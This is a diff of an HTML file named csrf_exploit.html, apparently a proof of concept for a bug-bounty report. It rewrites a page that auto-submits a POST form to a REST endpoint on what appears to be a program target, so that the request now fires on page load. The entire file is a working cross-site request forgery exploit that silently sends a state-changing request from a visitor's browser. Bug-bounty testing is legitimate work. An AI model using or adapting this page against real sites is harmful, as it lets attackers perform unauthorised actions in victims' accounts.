@@ -1,13 +1,8 @@
-<!DOCTYPE html>
+<!-- csrf_exploit.html -->
 <html>
-  <body>
-    <h2>CSRF Proof of Concept</h2>
-    <form id="csrfForm" action="https://intigriti.ilias-solutions.com/intigriti/moplan/rest/moplan/monthlyPlanAsset/ratio" method="POST">
-      <!-- No inputs needed if the original request had no body -->
+  <body onload="document.forms[0].submit()">
+    <form action="https://intigriti.ilias-solutions.com/intigriti/moplan/rest/moplan/monthlyPlanAsset/ratio" method="POST">
+      <!-- Assuming no body required (Content-Length: 0) -->
     </form>
-
-    <script>
-      document.getElementById("csrfForm").submit();
-    </script>
   </body>
 </html>
